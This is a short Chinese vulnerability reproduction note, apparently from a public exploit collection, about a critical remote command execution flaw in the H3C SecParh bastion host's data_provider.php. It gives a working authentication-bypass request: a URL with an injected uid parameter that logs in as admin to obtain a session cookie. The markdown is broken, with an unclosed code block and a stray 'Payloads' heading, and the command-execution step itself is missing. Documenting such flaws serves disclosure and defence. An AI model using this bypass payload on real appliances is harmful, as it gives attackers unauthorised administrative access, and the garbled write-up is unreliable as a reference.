# H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞

## 漏洞描述
H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202091828935.png)



先通过任意用户登录获取Cookie

```plain
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

## Payloads
```
![](images/202202091828626.png)
```
